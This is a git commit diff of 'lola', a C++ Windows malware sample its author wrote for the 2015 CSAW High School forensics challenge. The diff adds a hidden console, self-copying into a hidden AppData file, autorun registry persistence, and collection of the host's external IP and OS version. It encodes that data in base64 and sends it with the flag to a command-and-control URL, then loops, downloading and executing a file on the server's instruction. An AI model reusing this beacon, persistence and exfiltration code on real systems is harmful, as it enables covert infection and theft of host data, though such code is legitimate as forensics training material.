18fc221de1baa4842c20699f3811eedb01f9f664
Nick Anderson <nba237@nyu.edu>
2015-08-02 11:09:09 -0600

    Finished beacon functionality. Code is ready for an initial release

--- lola/lola/lola.cpp
+++ lola/lola/lola.cpp
@@ -3,34 +3,70 @@
  *
  * Nick Anderson - 2015
  *
- * This malware was written for the 2015 CSAW High School forensics challenge.  The malware
- * will drop to disk, and pull down a file from a C2 server.  The file pulled will contain
- * further instructions for the malware to carry out.
+ * This malware was written for the 2015 CSAW High School forensics challenge.
  *
- * TODO: We need to implement the following functionalities
- *	- Beacon to C2
- *    - Keep it easy, let's beacon to socialmalware.io, download a file, and perform an action based on that file
- *  - Persistence
- *    - K.I.S.S. Let's just install autorun registry
- *  - Stealth/Hiding Mech
- *    - Keep this simple, let's just move to APPData under a Microsoft named folder and run
  *  
- *
  */
 
 #include <sstream>
 #include <iostream>
+#include <stdio.h>
 #include <string>
 #include <stdlib.h>
 #include <Shlwapi.h>
 #include <ShlObj.h>
 #include <urlmon.h>
+#include <WinInet.h>
+#include <shellapi.h>
 
 using namespace std;
 
+#define OS_VERSION_BUFFER_SIZE 100
+#define MAX_URI_BUFFER_SIZE 255
+#define FLAG_LENGTH 35
+#define IP_BUFFER_SIZE 40
+#define XOR_KEY 0x42
+#define MAX_C2_BUFF_SIZE 0x500
+
+/* The flag is: flag_{l0la_w4nts_t0_n0m_y3r_warez} */
+// Flag encrypted with the XOR key, 0x42
+BYTE FLAG[] = {"\x24\x2e\x23\x25\x1d\x39\x2e\x72\x2e\x23\x1d\x35\x76\x2c\x36\x31\x1d\x36\x72\x1d\x2c\x72\x2f\x1d\x3b\x71\x30\x1d\x35\x23\x30\x27\x38\x3f\x0"};
+char IP[IP_BUFFER_SIZE];
 wchar_t* ROAMINGAPPDATAEXEC = new wchar_t[MAX_PATH];
 wchar_t* ROAMINGAPPDATAPATH = new wchar_t[MAX_PATH];
-const LPCSTR C2DOM = "https://www.socialmalware.io/static/hsf/cfg.dat";
+const LPCSTR C2DOM = "https://www.socialmalware.io/static/hsf/L0la.jpg";
+char* CFG_URI = "https://www.socialmalware.io/static/hsf/cfg.dat";
+char L0LA_IMG_PATH[MAX_PATH];
+char C2_BUFF[MAX_C2_BUFF_SIZE];
+
+/* Decrypt the flag blob */
+void decrypt(BYTE* flag){
+
+	for(size_t i = 0; flag[i] != 0x0; i++){
+		flag[i] = flag[i] ^ XOR_KEY;
+	}
+}
+
+/* This wont be used */
+void encrypt(BYTE* flag){
+	for(size_t i = 0; flag[i] != 0x0; i++){
+		flag[i] = flag[i] ^ XOR_KEY;
+	}
+}
+
+/* Grab our external IP address from canhazip.com */
+void get_ip()
+{
+	HINTERNET hInternet, hFile;
+	DWORD rsize;
+
+	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	hFile = InternetOpenUrlA(hInternet, "http://canhazip.com", NULL, 0, INTERNET_FLAG_RELOAD, 0);
+	InternetReadFile(hFile, &IP, sizeof(IP), &rsize);
+
+	InternetCloseHandle(hFile);
+	InternetCloseHandle(hInternet);
+}
 
 /* 
 	This functions only job should be to move itself, the exe, to APPDATA
@@ -46,6 +82,7 @@ const LPCSTR C2DOM = "https://www.socialmalware.io/static/hsf/cfg.dat";
 int hide(const wchar_t* epath){
 	
 	int ret = 0;
+	HINSTANCE sret = NULL;
 
 	/* Set the Hidden Attribute */
 	SetFileAttributes(epath,FILE_ATTRIBUTE_HIDDEN);
@@ -54,7 +91,8 @@ int hide(const wchar_t* epath){
 	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ROAMINGAPPDATAPATH) ) )
 	{
 		wstringstream wss;
-		wss << ROAMINGAPPDATAPATH << L"\\lola.exe";
+		wss.clear();
+		wss << ROAMINGAPPDATAPATH << L"\\lola.exe" << L'\x00';
 		wstring destPath = wss.str();
 		ret = CopyFile(epath, const_cast<LPWSTR>(destPath.c_str()), TRUE);
 
@@ -68,6 +106,14 @@ int hide(const wchar_t* epath){
 		note that this is where the result of CopyFile might come in handy, i.e. if
 		CopyFile returns FALSE, then we continue the other functionality, if it returns
 		TRUE, then we exit after deleting the old file and transfering execution*/
+		if(ret) /* delete the old file */
+		{
+			Sleep(10); // This is here to ensure that the original, spawning process has exited, before we delete.
+			ret = DeleteFile(epath);
+		}
+
+		sret = ShellExecute( NULL, L"open", const_cast<LPWSTR>(destPath.c_str()), NULL, NULL, 0 );
+
 
 		return EXIT_SUCCESS;
 	}
@@ -78,8 +124,7 @@ int hide(const wchar_t* epath){
 }
 
 /*
- * Make Lola persist.  To do this we'll attempt to 
- *
+ * Make Lola persist.  To do this we write a new reg key :3  Pretty obvious.
  */
 int persist()
 {
@@ -90,7 +135,7 @@ int persist()
 
 	const size_t count = MAX_PATH*2;
 	wchar_t szValue[count] = {};
-
+	memset(ROAMINGAPPDATAEXEC, 0x0, MAX_PATH);
 
 	wcscpy_s(szValue, count, L"\"");
 	wcscat_s(szValue, count, ROAMINGAPPDATAEXEC);
@@ -133,21 +178,84 @@ int beacon()
 
 	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, szDestPath) ) )
 	{
-		// This is so fucking gross :|
+		// Misc variables
+		DWORD len;
+		size_t ret;
+		BOOL cryptRet;
+		
+		// Buffer for the encoded flag
+		LPSTR flagbuff_encoded;
+
+		// Buffers for the encoded IP address
+		LPSTR ipbuff_encoded;
+		BYTE IPb[IP_BUFFER_SIZE];
+		
+		// Buffer for the encoded OS Version information
+		LPSTR os_ver_encoded;
+		char ver_info[OS_VERSION_BUFFER_SIZE];
+		BYTE ver_infob[OS_VERSION_BUFFER_SIZE];
+		OSVERSIONINFO osvi;
+
+		// Used to convert wide/narrow strings in Windows. Destination path for file download.
 		wstringstream wss;
-		wss << ROAMINGAPPDATAPATH << L"\\cfg.dat";
+
+		// Used to get further instructions in InternetOpen
+		HINTERNET hInternet, hFile;
+		DWORD rsize;
+		char uri[MAX_URI_BUFFER_SIZE];
+
+		// Init buffers to null
+		memset(L0LA_IMG_PATH, 0x0, sizeof(L0LA_IMG_PATH));
+		memset(uri, 0x0, MAX_URI_BUFFER_SIZE);
+		memset(IPb, 0x0, IP_BUFFER_SIZE);
+		memset(ver_info, 0x0, OS_VERSION_BUFFER_SIZE);
+		memset(ver_infob, 0x0, OS_VERSION_BUFFER_SIZE);
+
+		/* Decrypt the flag */
+		decrypt(FLAG);
+		cryptRet = CryptBinaryToStringA(FLAG, FLAG_LENGTH, CRYPT_STRING_BASE64, NULL, &len);
+		flagbuff_encoded = (LPSTR)malloc(len); // b64 container for the flag
+		cryptRet = CryptBinaryToStringA(FLAG, FLAG_LENGTH, CRYPT_STRING_BASE64, flagbuff_encoded, &len);
+
+		/* Get the OS Version, we'll send the major and minor values */
+		GetVersionEx(&osvi);
+		sprintf_s(ver_info, OS_VERSION_BUFFER_SIZE, "M:%d_m:%d_B:%d_P:%d", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber, osvi.dwPlatformId);
+		for(int i = 0; i < OS_VERSION_BUFFER_SIZE; i++)
+			ver_infob[i] = ver_info[i];
+		cryptRet = CryptBinaryToStringA(ver_infob, OS_VERSION_BUFFER_SIZE, CRYPT_STRING_BASE64, NULL, &len);
+		os_ver_encoded = (LPSTR)malloc(len);
+		cryptRet = CryptBinaryToStringA(ver_infob, OS_VERSION_BUFFER_SIZE, CRYPT_STRING_BASE64, os_ver_encoded, &len);
+
+		/* Get the external IP address */
+		get_ip();
+		for(int i = 0; i < IP_BUFFER_SIZE; i++)
+			IPb[i] = IP[i];
+		cryptRet = CryptBinaryToStringA(IPb, IP_BUFFER_SIZE, CRYPT_STRING_BASE64, NULL, &len);
+		ipbuff_encoded = (LPSTR)malloc(len);
+		cryptRet = CryptBinaryToStringA(IPb, IP_BUFFER_SIZE, CRYPT_STRING_BASE64, ipbuff_encoded, &len);
+
+		/* Setup the destination path for the download */
+		wss << ROAMINGAPPDATAPATH << L"\\lola.jpg";
 		wstring tmpDestPath = wss.str();
-		char destPath[MAX_PATH];
-		memset(destPath, 0x0, sizeof(destPath));
-		size_t retVal = 0;
-		wcstombs_s(&retVal, destPath, tmpDestPath.c_str(), sizeof(destPath));
+		memset(L0LA_IMG_PATH, 0x0, sizeof(L0LA_IMG_PATH));
+		wcstombs_s(&ret, L0LA_IMG_PATH, tmpDestPath.c_str(), sizeof(L0LA_IMG_PATH));
 
-		/* Get the cfg file from the server */
-		hRes = URLDownloadToFileA(NULL, C2DOM, destPath, 0, NULL);
+		/* Go get C2 instructions ;3 */
+		hRes = URLDownloadToFileA(NULL, C2DOM, L0LA_IMG_PATH, 0, NULL);
 
-		/* Parse the file to determine what action to take next */
 
-		return EXIT_SUCCESS;
+		/* Construct the full URI.  This will exfill the data, and get additional information*/
+		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+		// flag beacon: uri?ex=<b64 flag>&ip=<b64 ip>&ver=<b64 of OS info>
+		sprintf_s(uri, MAX_URI_BUFFER_SIZE, "%S?ex=%S&ip=%S&ver=%S", CFG_URI, flagbuff_encoded, ipbuff_encoded, os_ver_encoded);
+		hFile = InternetOpenUrlA(hInternet, uri, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+		InternetReadFile(hFile, &C2_BUFF, MAX_C2_BUFF_SIZE, &rsize);
+		C2_BUFF[rsize] = '\x0'; // ensure that we null terminate the values read :P
+
+		InternetCloseHandle(hFile);
+		InternetCloseHandle(hInternet);
+
+		return EXIT_SUCCESS; // Change this to the integer value read from the server.
 	}
 
 	return EXIT_FAILURE;
@@ -157,21 +265,41 @@ int beacon()
 /* Main :P */
 int main(int argc, char* argv[]){
 	
+	/* Hide the console window */
+	ShowWindow( GetConsoleWindow(), SW_HIDE );
+
 	/* locals */
 	size_t c2comm = 0;
 	size_t convChars = 0;
+	size_t ret = 0;
 	wchar_t execPath[MAX_PATH];
 
 	memset(execPath, 0x0, sizeof(execPath));
+
+	cout << argv[0] << endl;
+
 	mbstowcs_s(&convChars, execPath, argv[0], MAX_PATH); // TODO: This is a bug :P
 
 	/* Hide */
-	if( hide(execPath) == EXIT_FAILURE )
+
+	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ROAMINGAPPDATAPATH) ) )
 	{
-		/* Unable to copy exe to APPDATA */
-		cerr << "[-] Unable to copy Lola to APPDATA and/or Lola already exists in APPDATA!" << endl;
-		return EXIT_FAILURE;
+		/* If the program is executing out of APP data, then it's likely we've already infected this host.
+		Skip the Hiding process, and continue on */
+		// TODO: Change this to install/check for a mutex. This is a more elegant solution to prevent reinfection
+		char roaming_app_tmp[MAX_PATH];
+		wcstombs_s(&ret, roaming_app_tmp, ROAMINGAPPDATAPATH, MAX_PATH);
+		if(strstr(argv[0], roaming_app_tmp) == NULL)
+		{
+			if( hide(execPath) == EXIT_FAILURE )
+			{
+				/* Unable to copy exe to APPDATA */
+				cerr << "[-] Unable to copy Lola to APPDATA and/or Lola already exists in APPDATA!" << endl;
+				return EXIT_FAILURE;
+			}
+		}
 	}
+
 
 	/* Persist */
 	if( persist() )
@@ -180,11 +308,40 @@ int main(int argc, char* argv[]){
 		return EXIT_FAILURE;
 	}
 
-	/* Ask C2 what to do next */
-	c2comm = beacon();
+	while(true)
+	{
+		/* Ask C2 what to do next */
+		c2comm = beacon();
+		// TODO: Wrap this in a while(true) loop that just continuously beacons
 
-	// There's currently a memory leak :P
-	//delete ROAMINGAPPDATAEXEC;
-	//delete ROAMINGAPPDATAPATH;
+		if(c2comm == EXIT_SUCCESS)
+		{
+			BYTE instruction = C2_BUFF[0];
+
+			/* TODO: Add more functionality as desired. As this is a simple CTF challenge,
+			we really don't do much.  This code is left here as the template for the C2
+			actions. */
+			switch(instruction)
+			{
+			case 0x1:
+				Sleep(1000); // For testing
+				//Sleep(120000); // For prod
+				ShellExecuteA(0, 0, L0LA_IMG_PATH, 0, 0 , SW_SHOW );
+				break;
+
+			default:
+				Sleep(30000);
+			}
+
+		}
+		else
+		{
+			Sleep(300000);
+		}
+
+		// There's currently a memory leak :P
+		//delete ROAMINGAPPDATAEXEC;
+		//delete ROAMINGAPPDATAPATH;
+	}
 	return 0;
 }
